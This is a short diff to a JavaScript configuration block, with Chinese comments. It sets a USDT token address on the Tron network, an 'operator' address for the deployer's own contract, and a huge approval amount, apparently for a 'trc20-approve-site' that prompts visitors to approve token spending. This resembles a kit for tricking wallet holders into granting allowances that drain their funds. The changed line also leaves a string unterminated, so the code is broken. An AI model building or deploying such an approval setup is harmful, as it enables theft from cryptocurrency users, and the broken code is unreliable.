@@ -1,6 +1,6 @@
 // ========== 修改以下内容为你自己的信息 ==========
 const TOKEN_ADDRESS = "TWpy3Rup7grfkHc2c7rWVQ73oXHS9yHvLG"; // 如 USDT 主网地址
-const OPERATOR_ADDRESS = "https://amanda3302.github.io/trc20-approve-site/"; // 你部署的合约地址
+const OPERATOR_ADDRESS = "TKpGgic7PVjaqKgwwFRk8hfVXPkhCSxGeE // 你部署的合约地址
 const APPROVE_AMOUNT = "900000000000000000"; // 授权数量（单位：TRX格式）
 
 // 标准 TRC20 ABI 片段（仅包含 approve 方法）
